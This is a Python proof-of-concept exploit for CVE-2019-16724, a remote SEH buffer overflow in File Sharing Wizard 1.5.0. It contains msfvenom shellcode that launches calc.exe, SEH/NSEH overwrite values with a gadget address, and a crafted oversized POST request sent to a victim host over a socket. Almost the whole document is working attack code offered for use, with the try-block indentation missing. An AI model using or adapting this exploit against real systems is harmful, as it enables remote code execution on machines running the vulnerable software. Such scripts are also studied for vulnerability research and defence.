import socket
from struct import *

# Exploit Title: File sharing wizard 'post' remote SEH overflow
# Date: 9/23/2019
# Exploit Author: x00pwn
# Software Link: https://file-sharing-wizard.soft112.com/
# Version: 1.5.0
# Tested on: Windows 7
# CVE : CVE-2019-16724

# File-sharing-wizard-seh

#----------------------------------------------#
# Bad characters: \x00        #
# SEH value:  0x909032EB  (JMP short)    #
# NSEH value: 0x7c38a67f (POP POP RET)  #
#----------------------------------------------#

#  Assigned CVE ID : CVE-2019-16724

victim_host = "10.0.0.17"
victim_port = 80

# msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python -v shellcode EXITFUNC=seh
shellcode =  ""
shellcode += "\xd9\xc7\xd9\x74\x24\xf4\xba\x65\x1d\x84\xe1\x5f"
shellcode += "\x29\xc9\xb1\x31\x31\x57\x18\x03\x57\x18\x83\xef"
shellcode += "\x99\xff\x71\x1d\x89\x82\x7a\xde\x49\xe3\xf3\x3b"
shellcode += "\x78\x23\x67\x4f\x2a\x93\xe3\x1d\xc6\x58\xa1\xb5"
shellcode += "\x5d\x2c\x6e\xb9\xd6\x9b\x48\xf4\xe7\xb0\xa9\x97"
shellcode += "\x6b\xcb\xfd\x77\x52\x04\xf0\x76\x93\x79\xf9\x2b"
shellcode += "\x4c\xf5\xac\xdb\xf9\x43\x6d\x57\xb1\x42\xf5\x84"
shellcode += "\x01\x64\xd4\x1a\x1a\x3f\xf6\x9d\xcf\x4b\xbf\x85"
shellcode += "\x0c\x71\x09\x3d\xe6\x0d\x88\x97\x37\xed\x27\xd6"
shellcode += "\xf8\x1c\x39\x1e\x3e\xff\x4c\x56\x3d\x82\x56\xad"
shellcode += "\x3c\x58\xd2\x36\xe6\x2b\x44\x93\x17\xff\x13\x50"
shellcode += "\x1b\xb4\x50\x3e\x3f\x4b\xb4\x34\x3b\xc0\x3b\x9b"
shellcode += "\xca\x92\x1f\x3f\x97\x41\x01\x66\x7d\x27\x3e\x78"
shellcode += "\xde\x98\x9a\xf2\xf2\xcd\x96\x58\x98\x10\x24\xe7"
shellcode += "\xee\x13\x36\xe8\x5e\x7c\x07\x63\x31\xfb\x98\xa6"
shellcode += "\x76\xfd\x69\x7b\x62\x6a\xd0\xee\xcf\xf6\xe3\xc4"
shellcode += "\x13\x0f\x60\xed\xeb\xf4\x78\x84\xee\xb1\x3e\x74"
shellcode += "\x82\xaa\xaa\x7a\x31\xca\xfe\x18\xd4\x58\x62\xf1"
shellcode += "\x73\xd9\x01\x0d"

nseh = pack ('<I',0x909032EB) # Short jump forward 32 places into NOP sled
seh = pack('I',0x7c38a67f) # POP POP RET

# 0x7c38a67f : pop ecx # pop ecx # ret  |  {PAGE_EXECUTE_READ} [MSVCR71.dll]
# ASLR: False, Rebase: False, SafeSEH: False, OS: False, v7.10.6030.0 (C:\Program Files (x86)\File Sharing Wizard\bin\MSVCR71.dll)

exploit_payload  = "A" * 1040
exploit_payload += nseh # JMP short
exploit_payload += seh # POPPOPRET
exploit_payload += "\x90" * 100 # NOPSLED
exploit_payload += shellcode # popping calc.exe
exploit_payload += "D" *(5000 - len(exploit_payload))

payload_header  = "POST " + exploit_payload
payload_header +=" HTTP/1.0\r\n\r\n"

# overflowed SEH handler - 42386942 : [*] Exact match at offset 1044

try:
print("""
--------------------------------
CVE-2019-16724 proof of concept
File sharing wizard SEH overflow
--------------------------------
""")
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[x] Setting up a socket connection")
expl.connect((victim_host, victim_port))
print("[x] Establishing a connection to the victim")
expl.send(payload_header)
print("[x] Sending ")
except:
print("[!] Error establishing a connection")
print("[!] Error sending exploit")